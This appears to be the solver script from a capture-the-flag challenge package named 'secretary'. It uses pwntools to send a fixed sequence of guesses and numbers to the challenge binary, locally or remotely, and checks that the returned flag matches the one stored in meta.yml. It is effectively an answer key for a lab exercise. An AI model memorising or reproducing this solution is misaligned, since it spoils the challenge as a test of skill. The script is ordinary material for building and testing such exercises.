import os
import argparse
import yaml
import logging
from pwn import *
from pathlib import Path

logger = logging.getLogger("secretary")

# Load the flag dynamically from the meta file
HERE = Path(__file__).parent
FLAG = yaml.safe_load(open(HERE / "meta.yml"))["flags"]


# For local binary testing
def solve(p):
    binary = ELF(HERE / "src/chal")
    p.sendlineafter(b"want?\n", b"2")
    p.sendlineafter(b"guessing?\n", b"6")
    p.sendlineafter(b"it?\n", b"1337")
    p.sendlineafter(b"guessing?\n", b"7")
    p.sendlineafter(b"it?\n", b"1337")

    for i in range(4):
        p.sendlineafter(b"guessing?\n", str(i).encode())
        p.sendlineafter(b"it?\n", b"1337")

    nums = [0xb73,0x37a,0x3d3,0xdd,0x254,0x4be]
    for i in range(6):
        p.sendlineafter(b"guessing?\n", str(i).encode())
        p.sendlineafter(b"it?\n", str(nums[i]).encode())

    flag = p.recvuntil(b"}\n").decode()
    assert FLAG in flag, flag


### IF BINARY ###
def test(domain, port):
    sh = remote(domain, port)
    solve(sh)


if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    sh = process("./chal", cwd=f"{os.getcwd()}/src")
    solve(sh)

